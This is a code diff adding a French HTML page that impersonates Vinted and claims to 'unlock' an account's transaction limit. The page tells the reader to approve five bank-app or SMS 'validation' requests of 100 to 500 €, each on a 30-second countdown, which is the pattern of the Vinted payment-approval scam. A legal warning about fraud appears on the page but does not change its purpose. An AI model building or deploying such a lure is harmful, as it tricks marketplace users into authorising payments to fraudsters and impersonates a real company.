@@ -1,0 +1,301 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Déplafonnement de compte - Vinted</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+    <style>
+        body {
+            font-family: 'Roboto', Arial, sans-serif;
+            background-color: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            color: #333;
+            text-align: center;
+        }
+        .container {
+            background-color: #ffffff;
+            padding: 25px;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            width: 100%;
+            max-width: 550px;
+            box-sizing: border-box;
+            margin: 15px;
+        }
+        .logo {
+            margin-bottom: 20px;
+        }
+        .logo img {
+            max-width: 110px;
+            height: auto;
+            border: 0;
+        }
+        h2 {
+            font-size: 22px;
+            color: #007b76;
+            margin-bottom: 15px;
+            font-weight: 500;
+        }
+        p {
+            font-size: 0.95em;
+            line-height: 1.5;
+            color: #555;
+            margin-bottom: 10px;
+        }
+        .highlight-text {
+            color: #007b76;
+            font-weight: bold;
+        }
+        .simulation-section {
+            background-color: #f9f9f9;
+            border: 1px solid #eee;
+            border-radius: 5px;
+            padding: 15px;
+            margin-bottom: 15px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 10px;
+        }
+        .simulation-label {
+            font-weight: bold;
+            color: #333;
+            margin-bottom: 5px;
+        }
+        .random-amount {
+            color: #dc3545;
+            font-size: 1.1em;
+            font-weight: bold;
+        }
+        .request-simulation-btn {
+            padding: 8px 15px;
+            background-color: #007b76;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-size: 0.9em;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+        .request-simulation-btn:hover:not(:disabled) {
+            background-color: #005e5a;
+        }
+        .request-simulation-btn:disabled {
+            background-color: #a0a0a0;
+            cursor: not-allowed;
+        }
+        .simulation-feedback {
+            margin-top: 5px;
+            font-size: 0.85em;
+            color: #555;
+            min-height: 20px;
+        }
+        .feedback-message {
+            color: #28a745;
+            font-weight: bold;
+        }
+        .feedback-countdown {
+            color: #dc3545;
+            font-weight: bold;
+        }
+        .final-button { /* Nouvelle classe pour le bouton final */
+            display: inline-block;
+            padding: 10px 20px;
+            background-color: #007b76;
+            color: white;
+            text-decoration: none;
+            border-radius: 4px;
+            font-weight: bold;
+            font-size: 0.95em;
+            margin-top: 25px;
+            transition: background-color 0.3s ease;
+            cursor: pointer;
+            border: none;
+        }
+        .final-button:hover:not(:disabled) {
+            background-color: #005e5a;
+        }
+        .final-button:disabled {
+            background-color: #a0a0a0;
+            cursor: not-allowed;
+        }
+        .final-message {
+            margin-top: 20px;
+            font-size: 1.1em;
+            color: #007b76;
+            font-weight: bold;
+        }
+        .legal-warning {
+            background-color: #ffebe6;
+            border: 1px solid #dc3545;
+            border-radius: 5px;
+            padding: 12px;
+            margin-top: 20px;
+            text-align: left;
+            font-size: 0.8em;
+            color: #dc3545;
+        }
+        .legal-warning strong {
+            font-size: 1em;
+            display: block;
+            margin-bottom: 6px;
+        }
+
+        /* Ajustements responsifs */
+        @media (max-width: 600px) {
+            .container {
+                margin: 10px;
+                padding: 18px;
+            }
+            h2 {
+                font-size: 18px;
+            }
+            p {
+                font-size: 0.9em;
+            }
+            .legal-warning {
+                font-size: 0.75em;
+            }
+            .final-button, .request-simulation-btn {
+                font-size: 0.9em;
+                padding: 8px 15px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b8/Vinted_Logo_2022.svg/1280px-Vinted_Logo_2022.svg.png" alt="Logo Vinted">
+        </div>
+        <h2>Procédure de déplafonnement de votre compte Vinted</h2>
+
+        <p>Afin d'effectuer plus de transactions, nous allons procéder au <span class="highlight-text">déplafonnement de votre compte Vinted</span>. Ce processus implique plusieurs niveaux de validation pour garantir la sécurité et la conformité de votre profil.</p>
+
+        <p>Veuillez consulter l'application mobile de votre banque ou vos SMS pour chaque notification de <strong class="highlight-text">"validation de niveau de déplafonnement"</strong> correspondant aux montants ci-dessous. Il est essentiel de <span class="highlight-text">valider chaque demande</span> pour progresser dans le processus de déplafonnement et confirmer l'authenticité de vos coordonnées bancaires.</p>
+
+        <p class="highlight-text">Ayez votre application bancaire à portée de main.</p>
+
+        <div class="simulation-list">
+            <div class="simulation-section" id="sim-1">
+                <p class="simulation-label">1er niveau de déplafonnement : <span class="random-amount" id="amount-sim-1"></span></p>
+                <button class="request-simulation-btn" data-simulation-id="1">Demander la validation du niveau</button>
+                <div class="simulation-feedback" id="feedback-sim-1">
+                    <span class="feedback-message"></span>
+                    <span class="feedback-countdown"></span>
+                </div>
+            </div>
+
+            <div class="simulation-section" id="sim-2">
+                <p class="simulation-label">2ème niveau de déplafonnement : <span class="random-amount" id="amount-sim-2"></span></p>
+                <button class="request-simulation-btn" data-simulation-id="2">Demander la validation du niveau</button>
+                <div class="simulation-feedback" id="feedback-sim-2">
+                    <span class="feedback-message"></span>
+                    <span class="feedback-countdown"></span>
+                </div>
+            </div>
+
+            <div class="simulation-section" id="sim-3">
+                <p class="simulation-label">3ème niveau de déplafonnement : <span class="random-amount" id="amount-sim-3"></span></p>
+                <button class="request-simulation-btn" data-simulation-id="3">Demander la validation du niveau</button>
+                <div class="simulation-feedback" id="feedback-sim-3">
+                    <span class="feedback-message"></span>
+                    <span class="feedback-countdown"></span>
+                </div>
+            </div>
+
+            <div class="simulation-section" id="sim-4">
+                <p class="simulation-label">4ème niveau de déplafonnement : <span class="random-amount" id="amount-sim-4"></span></p>
+                <button class="request-simulation-btn" data-simulation-id="4">Demander la validation du niveau</button>
+                <div class="simulation-feedback" id="feedback-sim-4">
+                    <span class="feedback-message"></span>
+                    <span class="feedback-countdown"></span>
+                </div>
+            </div>
+
+            <div class="simulation-section" id="sim-5">
+                <p class="simulation-label">5ème niveau de déplafonnement : <span class="random-amount" id="amount-sim-5"></span></p>
+                <button class="request-simulation-btn" data-simulation-id="5">Demander la validation du niveau</button>
+                <div class="simulation-feedback" id="feedback-sim-5">
+                    <span class="feedback-message"></span>
+                    <span class="feedback-countdown"></span>
+                </div>
+            </div>
+        </div>
+
+        <div class="legal-warning">
+            <strong>AVERTISSEMENT LÉGAL : Utilisation Frauduleuse</strong>
+            <p>L'utilisation de moyens de paiement (cartes bancaires, identifiants) sans consentement est interdite et constitue une fraude, sévèrement punie par la loi (articles L. 163-1 et s. du Code monétaire et financier ; articles 313-1 et s. du Code pénal). N'utilisez que vos propres informations ou celles pour lesquelles vous avez une autorisation légale explicite.</p>
+        </div>
+
+        <button id="finalButton" class="final-button">J'ai validé toutes les demandes</button>
+        <p id="finalMessage" class="final-message" style="display: none;">Processus de déplafonnement terminé. Vous pouvez maintenant fermer cette fenêtre.</p>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', () => {
+            const fixedAmounts = {
+                1: '100,00 €',
+                2: '200,00 €',
+                3: '300,00 €',
+                4: '400,00 €',
+                5: '500,00 €'
+            };
+
+            for (let i = 1; i <= 5; i++) {
+                document.getElementById(`amount-sim-${i}`).textContent = fixedAmounts[i];
+            }
+
+            function startSimulation(simulationId) {
+                const feedbackDiv = document.getElementById(`feedback-sim-${simulationId}`);
+                const messageSpan = feedbackDiv.querySelector('.feedback-message');
+                const countdownSpan = feedbackDiv.querySelector('.feedback-countdown');
+                const requestButton = document.querySelector(`.request-simulation-btn[data-simulation-id="${simulationId}"]`);
+
+                messageSpan.textContent = "Validation du niveau envoyée sur banque ou SMS...";
+                countdownSpan.textContent = "";
+                requestButton.disabled = true;
+
+                let timeLeft = 30;
+                countdownSpan.textContent = `(reste ${timeLeft}s)`;
+
+                const timer = setInterval(() => {
+                    timeLeft--;
+                    if (timeLeft <= 0) {
+                        clearInterval(timer);
+                        countdownSpan.textContent = "(expiré)";
+                        messageSpan.textContent = "Validation du niveau terminée.";
+                    } else {
+                        countdownSpan.textContent = `(reste ${timeLeft}s)`;
+                    }
+                }, 1000);
+            }
+
+            const requestButtons = document.querySelectorAll('.request-simulation-btn');
+            requestButtons.forEach(button => {
+                button.addEventListener('click', () => {
+                    const simulationId = button.dataset.simulationId;
+                    startSimulation(simulationId);
+                });
+            });
+
+            // GESTION DU BOUTON FINAL
+            const finalButton = document.getElementById('finalButton');
+            const finalMessage = document.getElementById('finalMessage');
+
+            finalButton.addEventListener('click', () => {
+                finalButton.disabled = true; // Désactive le bouton
+                finalButton.textContent = "Processus terminé"; // Change le texte du bouton
+                finalMessage.style.display = 'block'; // Affiche le message final
+                // Pas de redirection ici
+            });
+        });
+    </script>
+</body>
+</html>
